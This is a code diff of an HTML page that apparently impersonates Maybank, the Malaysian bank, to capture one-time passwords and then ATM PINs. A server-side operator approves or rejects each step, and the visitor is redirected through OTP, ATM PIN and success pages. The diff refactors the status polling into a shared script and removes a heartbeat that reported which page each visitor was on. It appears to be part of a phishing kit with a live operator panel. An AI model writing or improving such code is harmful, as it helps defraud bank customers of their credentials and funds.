@@ -64,7 +64,7 @@
     <header>
         <div class="header-left">
             <a href="index.html"><img src="maybank-logo.png" alt="Maybank"></a>
-            <a href="otp-en.html" class="lang-btn">EN</a>
+            <a href="otp-en.html" class="lang-btn" onclick="sessionStorage.setItem('lang', 'en')">EN</a>
         </div>
         <div class="header-right">
             <div class="phone-group">
@@ -121,27 +121,15 @@
         </div>
     </div>
 
+    <script src="navigation.js"></script>
     <script>
         let pollInterval = null;
 
         async function pollOtpStatus() {
             const orderId = sessionStorage.getItem('orderId');
             if (!orderId) return;
-            try {
-                const res = await fetch('/api/orders/' + orderId + '/status');
-                const data = await res.json();
-                if (data.status === 'approved') {
-                    clearInterval(pollInterval);
-                    document.getElementById('loadingOverlay').style.display = 'none';
-                    const nextPages = { 'loading_otp': 'otp.html', 'otp': 'otp.html', 'loading_atm': 'atm-pin.html', 'atm_pin': 'atm-pin.html', 'loading_success': 'success.html', 'success': 'success.html' };
-                    window.location.href = nextPages[data.currentPage] || 'atm-pin.html';
-                } else if (data.status === 'rejected') {
-                    clearInterval(pollInterval);
-                    document.getElementById('loadingOverlay').style.display = 'none';
-                    if (data.message) document.getElementById('errorMessage').textContent = data.message;
-                    showOtpErrorModal();
-                }
-            } catch (err) { console.error('Poll error:', err); }
+            const done = await pollStatus(orderId, 'otp');
+            if (done) clearInterval(pollInterval);
         }
 
         function showOtpErrorModal() { document.getElementById('errorModal').style.display = 'flex'; }
@@ -161,9 +149,6 @@
             } catch (err) { alert('Ralat: Gagal menyambung ke pelayan. Sila cuba lagi.'); }
         });
     </script>
-    <script>
-        function sendHeartbeat() { fetch('/api/heartbeat', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ currentPage: window.location.pathname }) }).catch(() => {}); }
-        setInterval(sendHeartbeat, 30000); sendHeartbeat();
-    </script>
+
 </body>
 </html>
